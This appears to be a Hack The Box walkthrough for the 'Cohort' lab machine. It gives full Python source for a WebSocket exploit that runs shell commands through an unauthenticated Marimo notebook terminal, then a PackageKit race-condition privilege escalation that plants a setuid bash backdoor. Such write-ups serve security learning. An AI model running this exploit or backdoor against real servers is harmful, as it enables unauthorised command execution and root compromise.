# Cohort - Hack The Box Walkthrough

## User Privileges (CVE-2026-39987)

The leaked internal virtual host subdomain uncovers an unauthenticated instance of **Marimo**, a reactive open-source Python notebook workspace. Marimo installations below version `0.23.0` feature a vulnerability where the structural pseudo-terminal endpoint (`/terminal/ws`) can be accessed securely without validation tokens, yielding Remote Code Execution.

### The Problem with Public PoCs
Public community exploit scripts fail out-of-the-box on this machine. The reason is that public scripts attempt to push commands wrapped inside a `"type": "exec"` JSON event block. Marimo interprets this strictly as a request to compile an internal Python workbook cell. It simply echoes our text strings back as raw data frames without ever passing them to the underlying operating system's bash process.

### The Custom Socket Solution
To overcome this barrier, we engineered a custom standalone Python client using native `socket` and `ssl` modules. This script bypasses heavy dependencies, performs the secure manual WebSocket handshake upgrade over TLS, generates appropriate byte masking, and sends inputs natively inside the `"type": "stdin"` buffer wrapped with physical carriage returns (`\r`). This tricks the target server into interpreting our inputs as actual keystrokes fired on a physical keyboard terminal.

Here is the exact socket-based exploit code used to interact with the target and execute single system commands dynamically:

```python
import socket, ssl, base64, os, struct, time, select

TARGET_IP = "10.129.97.26"
HOST = "nb-1be3782a8afd3ad5.cohort.htb"
PATH = "/terminal/ws"

def connect():
    raw = socket.create_connection((TARGET_IP, 443), timeout=5)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n")
    s.sendall(req.encode())
    s.settimeout(5)
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(4096)
    print("[+] Handshake response:")
    print(resp.decode(errors="replace"))
    return s

def send_text(s, text):
    payload = text.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    length = len(payload)
    if length <= 125:
        header = struct.pack("!BB", 0x81, 0x80 | length)
    elif length <= 65535:
        header = struct.pack("!BBH", 0x81, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length)
    s.sendall(header + mask + masked)

def recv_frames(s, duration=3):
    end = time.time() + duration
    buf = b""
    out = b""
    while time.time() < end:
        r, _, _ = select.select([s], [], [], 0.5)
        if r:
            try:
                chunk = s.recv(4096)
            except (socket.timeout, ssl.SSLWantReadError):
                continue
            if not chunk:
                break
            buf += chunk
    while len(buf) >= 2:
        b1 = buf[1]
        masked = b1 & 0x80
        plen = b1 & 0x7F
        idx = 2
        if plen == 126:
            if len(buf) < 4: break
            plen = struct.unpack("!H", buf[2:4])[0]; idx = 4
        elif plen == 127:
            if len(buf) < 10: break
            plen = struct.unpack("!Q", buf[2:10])[0]; idx = 10
        if masked:
            if len(buf) < idx + 4: break
            mask_key = buf[idx:idx+4]; idx += 4
        else:
            mask_key = None
        if len(buf) < idx + plen: break
        payload = buf[idx:idx+plen]
        if mask_key:
            payload = bytes(c ^ mask_key[i % 4] for i, c in enumerate(payload))
        out += payload
        buf = buf[idx+plen:]
    return out

if __name__ == "__main__":
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; whoami; hostname"
    s = connect()
    print(recv_frames(s, 3).decode(errors="replace"))
    send_text(s, cmd + "\r")
    print(recv_frames(s, 4).decode(errors="replace"))
```

Executing this custom script allows us to natively pass system instructions as shell arguments, which we used to print out the first asset on the screen:

```bash
python3 marimo_exploit.py "cat /home/marimo/user.txt"
```

---

## Root Privileges (CVE-2026-41651)

With local user rights established, system checks verify the installation of **PackageKit 1.2.8** working alongside active D-Bus management frameworks. This environment is highly vulnerable to **CVE-2026-41651** ("Pack2TheRoot"), a critical Time-of-Check to Time-of-Use (**TOCTOU**) race condition affecting how the high-privilege PackageKit backend daemon processes transaction flag definitions during file local verification loops.

### The Troubleshooting Saga
Our efforts to compromise this layer ran into serious real-world complications that required significant debugging:

1. **The 335-Byte HTML File Trap:** Attempting to pull down a precompiled community C exploit binary (`exploit.bin`) over the target using `curl` from our attacking web directory repeatedly yielded an absolute dead process loop. Inspections via `ls -la` revealed the file size was exactly `335 bytes`. Our local Kali Python server was inadvertently serving an HTML "404 Not Found" string error wrapper instead of the real file object because of placement mismatches.
2. **The Queue Hang & App Crashes:** Attempting to feed straight system file paths or raw directory symbolic structures directly into `pkcon install-local` dropped execution bounds completely, dumping a fatal assertion error: `GLib-GIO-CRITICAL **: g_task_return_error: assertion 'error != NULL' failed`. The daemon simply crashed because it was expecting a fully structured, unpackable local package architecture.

### Winning the TOCTOU Race
To resolve these transfer corruptions and fully win the race condition, we opted to drop external binary dependencies entirely. Using the cloned public repository for `shibaaa204/Pack2TheRoot`, we successfully transferred the proper uncorrupted exploit file over to the target. 

The exploit builds two throwaway `.deb` packages locally — a harmless dummy, and a "payload" package whose `postinst` script copies `/bin/bash` to `/tmp/.suid_bash` with the setuid bit set. It fires the two racing D-Bus `InstallFiles` calls (SIMULATE against the dummy, immediately followed by a real install against the payload) and polls until the setuid binary appears.

We executed the payload loop through our custom script wrapper, giving the process threads a few seconds to run the background collision. The root-owned backdoor appeared on disk with `4755` permissions:

```bash
python3 marimo_exploit.py "/tmp/.suid_bash -p -c 'id; cat /root/root.txt'"
```

The `-p` flag tells bash to preserve the effective UID from the setuid bit rather than dropping privileges back to the real UID on startup, cleanly printing the final root flag.

